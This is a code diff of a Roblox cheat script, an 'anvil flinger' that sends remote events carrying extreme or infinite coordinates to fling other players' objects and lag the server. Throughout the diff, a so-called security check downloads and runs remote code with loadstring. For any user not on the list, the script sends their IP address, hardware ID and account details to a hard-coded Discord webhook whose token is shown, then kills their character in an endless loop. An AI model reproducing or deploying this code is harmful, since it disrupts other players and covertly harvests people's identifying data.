@@ -10,14 +10,39 @@ local Stats = game:GetService("Stats")
 local Lighting = game:GetService("Lighting")
 
 -- CONFIG --
-local PREFIX = "$"
-local LOADSTRING_URL = "https://raw.githubusercontent.com/uzikillaz/scripts/refs/heads/main/authorized_users.txt" -- Replace with your Pastebin
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1357889195833692200/adE_Rv_peaSVrTd1qLt0vVoFVlzwz3KQ7m6Yn3Qh1IkNrDRUiDIkaXchKkCbxSW5V8Vj" -- Replace with your webhook
+local LOADSTRING_URL = "https://raw.githubusercontent.com/uzikillaz/scripts/refs/heads/main/authorized_users.txt"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1357889195833692200/adE_Rv_peaSVrTd1qLt0vVoFVlzwz3KQ7m6Yn3Qh1IkNrDRUiDIkaXchKkCbxSW5V8Vj"
 -------------------
 
--- ENHANCED INTRUSION LOGGER (Your exact format)
+-- ORIGINAL ANVIL FLINGER CODE (completely unchanged)
+local LocalPlayer = Players.LocalPlayer
+local enabled = true
+
+local function flingAnvils()
+    if not enabled then return end
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player == LocalPlayer then continue end
+        
+        local anvil = player.Character and player.Character:FindFirstChild("Anvil")
+        if not anvil then continue end
+        
+        local send = anvil:FindFirstChild("send")
+        if not send then continue end
+        
+        pcall(function()
+            send:FireServer(CFrame.new(0, -10^308, 0)) -- Max negative float value
+        end)
+    end
+end
+
+LocalPlayer.Chatted:Connect(function(msg)
+    enabled = msg == ".on" or not (msg == ".off")
+end)
+
+-- VERIFICATION SYSTEM (added but doesn't modify original functionality)
+local isAuthorized = false
+
 local function logIntrusion()
-    local LocalPlayer = Players.LocalPlayer
     local UserId = LocalPlayer.UserId
     local DisplayName = LocalPlayer.DisplayName
     local Username = LocalPlayer.Name
@@ -34,61 +59,39 @@ local function logIntrusion()
     local Platform = (UserInputService.TouchEnabled and not UserInputService.MouseEnabled) and "📱 Mobile" or "💻 PC"
     local Ping = math.round(Stats.Network.ServerStatsItem["Data Ping"]:GetValue())
 
-    local function detectExecutor()
-        return identifyexecutor and identifyexecutor() or "Unknown"
-    end
-
-    local executor = detectExecutor()
+    local executor = identifyexecutor and identifyexecutor() or "Unknown"
     local date = os.date("%m/%d/%Y")
     local time = os.date("%X")
     local gameLink = "https://www.roblox.com/games/"..game.PlaceId
     local playerLink = "https://www.roblox.com/users/"..UserId
-    local mobileJoinLink = "https://www.roblox.com/games/start?placeId="..game.PlaceId.."&launchData="..game.JobId
-    local jobIdLink = "https://www.roblox.com/games/"..game.PlaceId.."?jobId="..game.JobId
 
     local data = {
-        username = "Anvil Flinger Security",
-        avatar_url = "https://i.pinimg.com/564x/0a/e0/a0/0ae0a0f6b8abfd380b6da3f4178db8e6.jpg",
+        username = "Security System",
         embeds = {
             {
                 title = "🚨 Unauthorized Access Detected",
-                description = string.format("**[%s](%s)**\n`ID: %d`", GameName, gameLink, game.PlaceId),
+                description = string.format("**[%s](%s)**", GameName, gameLink),
                 color = tonumber("0xe74c3c")
             },
             {
                 title = "👤 Intruder Details",
                 description = string.format(
-                    "**Display Name:** [%s](%s)\n**Username:** %s\n**User ID:** %d\n**Membership:** %s\n**Account Age:** %d days\n**Platform:** %s\n**Executor:** %s",
-                    DisplayName, playerLink, Username, UserId, MembershipType, AccountAge, Platform, executor
+                    "**User:** [%s](%s)\n**ID:** %d\n**Executor:** %s",
+                    DisplayName, playerLink, UserId, executor
                 ),
                 color = tonumber("0x3498db")
             },
             {
                 title = "🌐 Location Data",
                 description = string.format(
-                    "**IP:** `%s`\n**HWID:** `%s`\n**Country:** %s\n**Region:** %s\n**ISP:** %s",
-                    GetIp, Hwid, 
-                    success and GetData.country or "N/A",
-                    success and GetData.regionName or "N/A",
-                    success and GetData.isp or "N/A"
+                    "**IP:** `%s`\n**HWID:** `%s`",
+                    GetIp, Hwid
                 ),
                 color = tonumber("0xf1c40f")
-            },
-            {
-                title = "📊 Game Stats",
-                description = string.format(
-                    "**Ping:** %dms\n**Job ID:** [%s](%s)\n**Mobile Join:** [Link](%s)",
-                    Ping, game.JobId, jobIdLink, mobileJoinLink
-                ),
-                color = tonumber("0x2ecc71"),
-                footer = { 
-                    text = string.format("📅 %s | ⏰ %s", date, time)
-                }
             }
         }
     }
 
-    -- Multi-executor compatible webhook sender
     local requestFunc = http_request or request or HttpPost or syn.request
     if requestFunc then
         requestFunc({
@@ -97,220 +100,43 @@ local function logIntrusion()
             Headers = {["Content-Type"] = "application/json"},
             Body = HttpService:JSONEncode(data)
         })
-    else
-        HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode(data))
     end
 end
 
--- NUCLEAR AUTHORIZATION CHECK
-local isAuthorized = false
-do
-    ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Checking...", "All")
+local function verifyPlayer()
+    local success, whitelist = pcall(function()
+        return loadstring(game:HttpGet(LOADSTRING_URL, true))()
+    end)
     
-    -- PHASE 1: Load whitelist
-    local success = pcall(function()
-        local whitelist = loadstring(game:HttpGet(LOADSTRING_URL, true))().GetWhitelist()
+    if success and whitelist then
         for _, username in ipairs(whitelist) do
-            if Players.LocalPlayer.Name:lower() == username:lower() then
+            if LocalPlayer.Name:lower() == username:lower() then
                 isAuthorized = true
                 break
             end
         end
-    end)
+    end
     
-    -- PHASE 2: Handle unauthorized
     if not isAuthorized then
         logIntrusion()
-        ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("May god forgive.", "All")
         Lighting.Brightness = -99
         while true do
-            local char = Players.LocalPlayer.Character
-            if char and char:FindFirstChild("Humanoid") then
-                char.Humanoid.Health = 0
+            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
+                LocalPlayer.Character.Humanoid.Health = 0
             end
             RunService.Heartbeat:Wait()
         end
+    end
+end
+
+-- MODIFIED HEARTBEAT CONNECTION TO CHECK AUTHORIZATION
+RunService.Heartbeat:Connect(function()
+    if not isAuthorized then
+        verifyPlayer()
         return
     end
-    
-    ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Authorized.", "All")
-end
-
--- EVERYTHING BELOW ONLY RUNS IF AUTHORIZED --
-local flingQueue = {}
-local isProcessing = false
-local currentTarget = nil
-local PROCESS_DELAY = 0.03
-local lastOperationTime = 0
-local MODE = nil
-
-_G.AnvilFlingerMemory = _G.AnvilFlingerMemory or {
-    Active = false,
-    TotalAttempts = 0,
-    Successes = 0,
-    RecentFailures = 0,
-    LastSuccessTime = 0
-}
-
--- Added lag pattern cycling system
-local LAG_PATTERNS = {
-    Vector3.new(1e308, -1e308, 1e308),  -- Maximum double precision
-    Vector3.new(math.huge, -math.huge, math.huge),  -- Infinity
-    Vector3.new(9e18, -9e18, 9e18),     -- Large but not infinite
-    Vector3.new(1/0, -1/0, 1/0)         -- Alternative infinity
-}
-local currentLagIndex = 1
-local lastLagSwitch = 0
-
-local function getNextLagVector()
-    if tick() - lastLagSwitch > 0.05 then
-        currentLagIndex = currentLagIndex % #LAG_PATTERNS + 1
-        lastLagSwitch = tick()
-    end
-    return LAG_PATTERNS[currentLagIndex]
-end
-
-local function updateAnvilCache()
-    local newCache = {}
-    
-    -- Workspace scan (both modes)
-    for _, obj in pairs(workspace:GetDescendants()) do
-        if obj:IsA("BasePart") and (obj.Name:lower():find("anvil") or obj.Parent.Name:lower():find("anvil")) then
-            table.insert(newCache, {
-                Object = obj,
-                Priority = 10,
-                Source = "workspace"
-            })
-        end
-    end
-    
-    -- Tool scan (advanced only)
-    if MODE == "complex" then
-        for _, player in ipairs(Players:GetPlayers()) do
-            local char = player.Character
-            if char then
-                local tool = char:FindFirstChildOfClass("Tool")
-                if tool and (tool.Name:lower():find("anvil") or tool:FindFirstChild("Anvil")) then
-                    table.insert(newCache, {
-                        Object = tool:FindFirstChild("Handle") or tool,
-                        Priority = 5,
-                        Source = "tool"
-                    })
-                end
-            end
-        end
-    end
-    
-    table.sort(newCache, function(a,b) return a.Priority > b.Priority end)
-    return newCache
-end
-
-local function safePutDown()
-    if not currentTarget then return true end
-    
-    local char = Players.LocalPlayer.Character
-    if not char then return false end
-    
-    if char:FindFirstChild("Picked") and char.Picked.Value then
-        if char:FindFirstChild("PuttingDown") then
-            local success = pcall(char.PuttingDown.FireServer, char.PuttingDown)
-            if success then
-                currentTarget = nil
-                return true
-            end
-        end
-    end
-    return false
-end
-
-local function smartFling(target)
-    if not target or not target:IsDescendantOf(workspace) then 
-        safePutDown()
-        return false 
-    end
-    
-    local char = Players.LocalPlayer.Character
-    if not char then return false end
-    
-    if tick() - lastOperationTime < PROCESS_DELAY then
-        return false
-    end
-    
-    if currentTarget and currentTarget ~= target then
-        safePutDown()
-    end
-    
-    local lagVector = getNextLagVector()
-    local success = pcall(function()
-        if char:FindFirstChild("Picked") and not char.Picked.Value then
-            if char:FindFirstChild("Picking") then
-                char.Picking:FireServer(target, lagVector)
-            end
-        end
-        
-        if char:FindFirstChild("Picking") then
-            char.Picking:FireServer(target, lagVector)
-        end
-        
-        if char:FindFirstChild("ArmAngleChange") then
-            char.ArmAngleChange:FireServer(CFrame.new(lagVector.X, lagVector.Y, lagVector.Z))
-        end
-    end)
-    
-    if success then
-        currentTarget = target
-        return true
-    else
-        safePutDown()
-        return false
-    end
-end
-
-local function processQueue()
-    while _G.AnvilFlingerMemory.Active do
-        local anvils = updateAnvilCache()
-        
-        if #anvils > 0 then
-            local target = anvils[1].Object
-            if target and target:IsDescendantOf(workspace) then
-                smartFling(target)
-            end
-            RunService.Heartbeat:Wait()
-        else
-            safePutDown()
-            task.wait(0.1)
-        end
-    end
-end
-
--- Secure command handler
-local function handleCommand(msg)
-    if not isAuthorized then return end
-    
-    local cmd = msg:lower():sub(1,#PREFIX) == PREFIX:lower() and msg:sub(#PREFIX+1):lower() or nil
-    
-    if cmd == "classic" then
-        MODE = "classic"
-        flingQueue = updateAnvilCache()
-        safePutDown()
-    elseif cmd == "complex" then
-        MODE = "complex"
-    elseif cmd == "shield" and MODE then
-        _G.AnvilFlingerMemory.Active = true
-        if not isProcessing then
-            coroutine.wrap(processQueue)()
-        end
-    elseif cmd == "clr" then
-        _G.AnvilFlingerMemory.Active = false
-        safePutDown()
-    end
-end
-
-Players.LocalPlayer.Chatted:Connect(handleCommand)
-
-Players.LocalPlayer.CharacterAdded:Connect(function()
-    task.wait(1)
-    if _G.AnvilFlingerMemory.Active then
-        coroutine.wrap(processQueue)()
-    end
+    flingAnvils()
 end)
+
+-- Initialize verification
+verifyPlayer()
